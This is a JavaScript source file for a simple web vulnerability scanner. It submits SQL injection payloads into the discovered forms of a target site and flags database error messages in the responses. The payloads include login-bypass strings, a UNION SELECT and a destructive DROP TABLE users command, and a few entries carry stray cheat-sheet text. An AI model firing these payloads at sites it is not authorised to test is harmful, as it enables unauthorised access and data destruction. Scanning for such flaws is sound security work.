const axios = require('axios');
const cheerio = require('cheerio');

class SQLInjectionScanner {
    constructor() {
        this.name = 'SQL Injection';
        this.payloads = [
            "' OR 1=1 --",
            "' OR 'a'='a",
            "'; DROP TABLE users; --",
            "' UNION SELECT null, null, null --",
            "<username>' OR 1=1--",
            "'OR '' = '	Allows authentication without a valid username.",
            "<username>'--",
            "' union select 1, '<user-fieldname>', '<pass-fieldname>'    1--",
        ];
        this.errorIndicators = [
            "You have an error in your SQL syntax",
            "Warning: mysql_fetch_array()",
            "Unclosed quotation mark after the character string",
            "quoted string not properly terminated",
        ];
    }


    // Function to discover forms on the target page
    async discoverForms(target) {
        try {
            const response = await axios.get(target);
            const $ = cheerio.load(response.data);
            const forms = [];

            $('form').each((i, form) => {
                const action = $(form).attr('action');
                const method = $(form).attr('method') || 'get';
                const inputs = [];

                $(form).find('input').each((j, input) => {
                    const name = $(input).attr('name');
                    const type = $(input).attr('type') || 'text';
                    inputs.push({ name, type });
                });

                forms.push({ action, method, inputs });
            });

            return forms;
        } catch (error) {
            console.error(`Error discovering forms on ${target}: ${error.message}`);
            return [];
        }
    }

    async startScan(target) {
        const forms = await this.discoverForms(target);
        let results = [];

        for (let form of forms) {
            for (let payload of this.payloads) {
                try {
                    const response = await this.submitForm(target, form, payload);

                    if (this.isVulnerable(response.data)) {
                        results.push({
                            type: this.name,
                            severity: 'High',
                            description: `Vulnerable to SQL Injection in form with payload: ${payload}`,
                            location: `${target}${form.action}`,
                        });
                    } else {
                        results.push({
                            type: this.name,
                            severity: 'NONE',
                            description: `No vulnerability found in form with payload: ${payload}`,
                            location: `${target}${form.action}`,
                        });
                    }
                } catch (error) {
                    results.push({
                        type: this.name,
                        severity: 'ERROR',
                        description: `Error testing form with payload ${payload}: ${error.message}`,
                        location: `${target}${form.action}`,
                    });
                }
            }
        }

        return results;
    }

    // Function to submit a form with a payload
    async submitForm(target, form, payload) {
        const url = new URL(form.action, target).href;
        const data = {};

        form.inputs.forEach(input => {
            data[input.name] = input.type === 'text' ? payload : 'test';
        });

        if (form.method.toLowerCase() === 'post') {
            return await axios.post(url, data);
        } else {
            const params = new URLSearchParams(data);
            return await axios.get(`${url}?${params.toString()}`);
        }
    }

    // Function to check if the response indicates a vulnerability
    isVulnerable(responseData) {
        return this.errorIndicators.some(indicator => responseData.includes(indicator));
    }
}

module.exports = SQLInjectionScanner;
